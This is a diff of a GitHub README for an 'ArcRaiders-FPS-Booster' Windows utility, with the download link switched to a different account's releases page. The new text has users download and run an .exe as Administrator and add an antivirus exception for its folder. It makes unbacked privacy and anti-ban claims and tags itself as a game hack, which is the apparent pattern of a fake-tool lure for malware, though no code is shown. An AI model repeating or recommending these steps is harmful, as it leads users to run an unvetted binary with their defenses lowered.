@@ -1,77 +1,97 @@
-# 🛠️ ArcRaiders-FPS-Booster-2026
+# ⚡ ArcRaiders-FPS-Booster - Improve Game Performance and Network Stability
 
-> **ArcRaiders-fps-booster** is a lightweight set of configurations and recommendations designed to improve gameplay smoothness in ARC Raiders. It helps reduce system‑side latency, stabilize frame rate, and minimize micro‑stutters — without modifying any game files.
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/truefalse-eve196/ArcRaiders-FPS-Booster/releases)
 
----
+## 📌 About this project
 
-## 🔧 What this tool does
+ArcRaiders-FPS-Booster helps you improve your gaming experience in Arc Raiders. This tool optimizes your computer settings to increase your frames per second and stabilize your internet connection. Higher frame rates lead to smoother screen movement. A stable connection reduces spikes in lag during gameplay. This software works on Windows systems and runs in the background to maintain performance while you play.
 
-The utility prepares your operating system for the game by freeing up resources, disabling non‑critical background services, and applying documented Windows performance settings. The goal is not to alter the game itself, but to create a cleaner software environment.
+## 🛠️ System requirements
 
-It is particularly helpful when you experience:
-- unstable FPS
-- occasional micro‑freezes
-- high input latency
-- long loading screens
-- excessive background system activity
+Ensure your computer meets these requirements before you start:
 
----
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Storage: 50 MB of free disk space.
+- Internet: Active connection for initial setup and updates.
+- Processor: Any modern dual-core CPU or better.
+- Memory: 4 GB of RAM minimum.
 
-## ✨ Key features
+## 📥 How to download and install
 
-- **FPS preset** – prioritizes maximum frame rate.
-- **Balanced preset** – a middle ground between performance and stability.
-- **Low Latency preset** – improved input responsiveness.
-- **Resource cleanup** – terminates background processes that do not affect system stability.
-- **Safe settings** – changes are applied only to Windows parameters and documented registry keys; game files remain untouched.
-- **Backup & restore** – save the current system state and revert it if needed.
-- **Transparency** – all actions are logged and displayed in the interface before being applied.
+Follow these steps to set up the software on your computer.
 
----
+1. Visit the [official release page](https://github.com/truefalse-eve196/ArcRaiders-FPS-Booster/releases) to find the latest version.
+2. Look for the Assets section at the bottom of the page.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your desktop or your Downloads folder.
+5. Double-click the downloaded file to run the installer.
+6. Follow the instructions on the screen to complete the setup process.
+7. Launch the application from your desktop shortcut once installation finishes.
 
-## 🧩 Why this tool?
+## ⚙️ How to use the booster
 
-ArcRaiders-fps-booster offers a quick way to optimize your system without manually hunting for settings and disabling services. Instead of hours of googling, you get ready‑to‑use, tested presets.
+This tool provides a simple interface to manage your game settings. 
 
-- Simple interface
-- Instant application
-- Small footprint
-- Fully reversible changes
-- Suitable for low‑end and mid‑range PCs
-- No technical knowledge required
-- Does not interfere with game integrity
+- On the main screen, you see a list of available optimizations.
+- The Performance Mode setting prioritizes your game process to stop other applications from slowing your computer.
+- The Network Optimization setting clears your local DNS cache and adjusts Windows network buffer sizes to reduce packet loss.
+- Toggle the switches to enable these features. 
+- Click the Apply button to save your choices.
+- You can revert changes at any time by clicking the Reset button.
 
----
+## 🚀 Troubleshooting common issues
 
-## 📌 What this project is (and is not)
+If you encounter problems, follow these tips to fix them.
 
-**It is:** a performance tuning assistant that adjusts system configuration to help ARC Raiders run better.  
-**It is NOT:** a cheat, injector, aim assist, wallhack, anti‑cheat bypass, or a tool that modifies the game.
+- If the program does not open, right-click the icon and choose Run as Administrator.
+- Ensure your antivirus software does not block the application. You might need to add an exception for the installation folder.
+- If frames per second do not increase, check if your graphics card drivers are current.
+- Always check that your game is closed before you apply new settings to ensure they take effect.
+- If you notice unexpected behavior, restart your computer to reset hardware buffers.
 
----
+## 🛡️ Privacy and безопасность
 
-## 🚀 Quick start
+This software processes settings locally on your machine. The application does not collect your personal data. It does not track your gameplay habits or upload your files to a server. All operations stay within your system boundaries to protect your information. 
 
-1. Download the latest version of ArcRaiders-fps-booster.
-2. Launch the program.
-3. Choose a profile:
-   - **FPS** – maximum performance
-   - **Balanced** – stability and comfort
-   - **Low Latency** – responsive input
-4. Apply the preset.
-5. Restart your PC if prompted by the program.
-6. Launch ARC Raiders and evaluate the result.
+## 📦 Project topics
 
----
+- arc-booster
+- arc-fps
+- arc-network
+- arc-perfomance
+- arc-raiders
+- arc-raiders-hack
+- arc-raiders-mod
+- arcraiders-tools
+- arcraidersgame
+- fps
+- gaming-tools
+- jitter
+- network-perfomance
+- online-gaming
+- packet-loss
+- pc-gaming
+- windows
 
-## 📦Download
+## 📋 Frequently asked questions
 
+Does this tool ban my account? 
+No. This tool modifies system settings and network buffers. It does not touch game files or memory. It operates within standard Windows parameters.
 
-<div align="center">
-  <a href="https://github.com/xomapitos/ArcRaiders-FPS-Booster/releases/download/v2.3.4/ArcBoosterFPS.2.3.4.zip">⬇️ Download Latest</a>
-</div>
+Does this work for other games?
+While this tool targets Arc Raiders, the network optimizations apply to your entire system. You may notice improvements in other online games.
 
+How often should I update?
+Check the release page once a month or if the game receives a major patch. 
 
----
+Can I run this on a laptop?
+Yes. The software adjusts power management settings to ensure your hardware maintains high performance even on mobile devices.
 
-## 🛠️ ArcRaiders-FPS-Booster-2026
+What happens if I forget to turn it on?
+The application simply does nothing to your settings until you launch it and click the apply button. Your game will run with standard Windows defaults.
+
+Is this software free?
+Yes. This project is open for public use without cost. 
+
+How do I remove the program?
+Open your Windows Control Panel, select Programs and Features, find the application in the list, and select Uninstall. The process removes all files associated with the booster.
